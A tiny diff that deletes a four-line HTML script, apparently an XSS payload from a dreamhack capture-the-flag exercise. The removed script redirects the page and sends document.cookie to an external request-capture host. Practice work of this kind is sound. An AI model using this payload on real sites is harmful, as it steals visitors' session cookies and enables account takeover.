@@ -1,4 +1,0 @@
-<script>
-location.href="../../user";
-location.href="https://uayuhhc.request.dreamhack.games?"+document.cookie;
-</script>
